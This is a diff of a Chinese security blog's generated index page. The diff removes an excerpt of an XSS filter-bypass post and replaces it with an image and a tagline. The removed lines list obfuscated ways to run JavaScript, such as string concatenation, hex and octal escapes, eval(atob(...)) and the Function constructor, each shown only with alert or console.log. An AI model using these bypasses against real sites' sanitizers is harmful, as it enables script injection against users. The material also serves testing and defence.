@@ -310,9 +310,10 @@
   <div class="row">
 	
 	
-		<h1 id="特殊bypass"><a href="#特殊bypass" class="headerlink" title="特殊bypass"></a>特殊bypass</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[1].find(alert);</span><br><span class="line">top[&#x27;al\x65rt&#x27;](2);</span><br><span class="line">top[&quot;al&quot;+&quot;ert&quot;](3);</span><br><span class="line">setTimeout(&#x27;ale&#x27;+&#x27;rt(4)&#x27;);</span><br><span class="line">Function(&quot;ale&quot;+&quot;rt(5)&quot;)();</span><br><span class="line">new Function`al\ert\`6\``;</span><br><span class="line">setInterval(&#x27;ale&#x27;+&#x27;rt(7)&#x27;);</span><br><span class="line">top[8680439..toString(30)](8);</span><br><span class="line">top[/al/.source+/ert/.source](9);</span><br><span class="line">open(&#x27;java&#x27;+&#x27;script:ale&#x27;+&#x27;rt(10)&#x27;);</span><br></pre></td></tr></table></figure>
-
-<h1 id="编码变形"><a href="#编码变形" class="headerlink" title="编码变形"></a>编码变形</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">## Base64 编码</span><br><span class="line">eval(atob(&quot;YWxlcnQoMSk=&quot;));</span><br><span class="line"></span><br><span class="line">## 十六进制 编码</span><br><span class="line">eval(&#x27;alert\x281\x29&#x27;);</span><br><span class="line"></span><br><span class="line">## 八进制 编码</span><br><span class="line">eval(&#x27;a\154ert(1)&#x27;);</span><br><span class="line"></span><br><span class="line">## Function 执行代码</span><br><span class="line">Function(&quot;alert(1)&quot;)()</span><br><span class="line"></span><br><span class="line">## ` 代替括号</span><br><span class="line">Function`alert(1)`()</span><br><span class="line">Function`alert(1)```</span><br><span class="line">Function`alert\x281\x29```</span><br><span class="line"></span><br><span class="line">## - 替换 ;</span><br><span class="line">var app=&#x27;&#x27;-Function(&quot;console.log`test_-`&quot;)()-&#x27;&#x27;;</span><br><span class="line">var app=&#x27;&#x27;;Function(&quot;console.log`test_;`&quot;)();&#x27;&#x27;;</span><br><span class="line">Function(atob(&#x27;Y29uc29sZS5sb2dgVGVzdGA=&#x27;))()-&#x27;&#x27;;</span><br></pre></td></tr></table></figure>
+		<p><img src="/images/WhatisXSS.jpg" alt="upload successful"></p>
+<blockquote>
+<p>通过巧妙的方法注入恶意指令代码到网页，使浏览器用户加载并执行Javascript代码其乐无穷.</p>
+</blockquote>
 	
 
 	</div>
@@ -324,9 +325,10 @@
   <div class="row">
 	
 	
-		<h1 id="特殊bypass"><a href="#特殊bypass" class="headerlink" title="特殊bypass"></a>特殊bypass</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[1].find(alert);</span><br><span class="line">top[&#x27;al\x65rt&#x27;](2);</span><br><span class="line">top[&quot;al&quot;+&quot;ert&quot;](3);</span><br><span class="line">setTimeout(&#x27;ale&#x27;+&#x27;rt(4)&#x27;);</span><br><span class="line">Function(&quot;ale&quot;+&quot;rt(5)&quot;)();</span><br><span class="line">new Function`al\ert\`6\``;</span><br><span class="line">setInterval(&#x27;ale&#x27;+&#x27;rt(7)&#x27;);</span><br><span class="line">top[8680439..toString(30)](8);</span><br><span class="line">top[/al/.source+/ert/.source](9);</span><br><span class="line">open(&#x27;java&#x27;+&#x27;script:ale&#x27;+&#x27;rt(10)&#x27;);</span><br></pre></td></tr></table></figure>
-
-<h1 id="编码变形"><a href="#编码变形" class="headerlink" title="编码变形"></a>编码变形</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">## Base64 编码</span><br><span class="line">eval(atob(&quot;YWxlcnQoMSk=&quot;));</span><br><span class="line"></span><br><span class="line">## 十六进制 编码</span><br><span class="line">eval(&#x27;alert\x281\x29&#x27;);</span><br><span class="line"></span><br><span class="line">## 八进制 编码</span><br><span class="line">eval(&#x27;a\154ert(1)&#x27;);</span><br><span class="line"></span><br><span class="line">## Function 执行代码</span><br><span class="line">Function(&quot;alert(1)&quot;)()</span><br><span class="line"></span><br><span class="line">## ` 代替括号</span><br><span class="line">Function`alert(1)`()</span><br><span class="line">Function`alert(1)```</span><br><span class="line">Function`alert\x281\x29```</span><br><span class="line"></span><br><span class="line">## - 替换 ;</span><br><span class="line">var app=&#x27;&#x27;-Function(&quot;console.log`test_-`&quot;)()-&#x27;&#x27;;</span><br><span class="line">var app=&#x27;&#x27;;Function(&quot;console.log`test_;`&quot;)();&#x27;&#x27;;</span><br><span class="line">Function(atob(&#x27;Y29uc29sZS5sb2dgVGVzdGA=&#x27;))()-&#x27;&#x27;;</span><br></pre></td></tr></table></figure>
+		<p><img src="/images/WhatisXSS.jpg" alt="upload successful"></p>
+<blockquote>
+<p>通过巧妙的方法注入恶意指令代码到网页，使浏览器用户加载并执行Javascript代码其乐无穷.</p>
+</blockquote>
 	
 	</div>
   <a type="button" href="/post/XSS_Bypass/#more" class="btn btn-default more">Read More</a>
@@ -772,27 +774,27 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/杀猪盘/">杀猪盘<span>5</span></a></li>
+			<li><a href="/tags/游戏交易类/">游戏交易类<span>1</span></a></li>
 		
 			<li><a href="/tags/理财类/">理财类<span>20</span></a></li>
 		
-			<li><a href="/tags/借贷类/">借贷类<span>18</span></a></li>
+			<li><a href="/tags/果聊类/">果聊类<span>2</span></a></li>
 		
-			<li><a href="/tags/刷单类/">刷单类<span>7</span></a></li>
-		
-			<li><a href="/tags/ETC类/">ETC类<span>1</span></a></li>
-		
-			<li><a href="/tags/游戏交易类/">游戏交易类<span>1</span></a></li>
-		
-			<li><a href="/tags/菠菜类/">菠菜类<span>15</span></a></li>
+			<li><a href="/tags/杀猪盘/">杀猪盘<span>5</span></a></li>
 		
 			<li><a href="/tags/公检法类/">公检法类<span>2</span></a></li>
 		
-			<li><a href="/tags/投资类/">投资类<span>1</span></a></li>
+			<li><a href="/tags/菠菜类/">菠菜类<span>15</span></a></li>
 		
 			<li><a href="/tags/客服类/">客服类<span>3</span></a></li>
 		
-			<li><a href="/tags/果聊类/">果聊类<span>2</span></a></li>
+			<li><a href="/tags/ETC类/">ETC类<span>1</span></a></li>
+		
+			<li><a href="/tags/刷单类/">刷单类<span>7</span></a></li>
+		
+			<li><a href="/tags/投资类/">投资类<span>1</span></a></li>
+		
+			<li><a href="/tags/借贷类/">借贷类<span>18</span></a></li>
 		
 		 
 		</ul>
